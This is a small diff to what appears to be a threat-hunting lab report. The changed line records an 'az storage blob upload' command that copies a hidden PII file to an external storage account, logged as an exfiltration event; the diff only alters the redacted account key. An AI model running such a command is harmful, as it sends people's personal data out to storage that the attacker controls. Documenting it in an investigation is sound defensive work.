@@ -178,7 +178,7 @@ DeviceNetworkEvents
   
 - Event: PII data uploaded to external storage
   
-- Command: az storage blob upload --account-name chuck --account-key [REDACTED] --container-name chuckcontainer --file /home/lab12/.secret_data1/.pii_file.txt --name test_file
+- Command: az storage blob upload --account-name chuck --account-key  --container-name chuckcontainer --file /home/lab12/.secret_data1/.pii_file.txt --name test_file
   
 - Source File: /home/lab12/.secret_data1/.pii_file.txt (hidden PII file)
   
